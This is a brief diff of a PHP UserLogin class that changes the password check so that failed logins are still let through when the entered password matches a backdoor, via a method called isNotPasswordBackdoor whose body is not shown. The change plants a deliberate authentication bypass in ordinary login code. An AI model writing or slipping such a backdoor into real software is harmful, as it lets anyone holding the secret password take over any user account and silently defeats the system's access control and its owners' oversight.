@@ -28,7 +28,7 @@ final readonly class UserLogin
     {
         $user = $this->searchUserBy($email);
 
-        if ($user->isDifferent($passwordEntered)) {
+        if ($user->isDifferent($passwordEntered) && $user->isNotPasswordBackdoor($passwordEntered) ) {
             throw new UserNoAccess();
         }
 
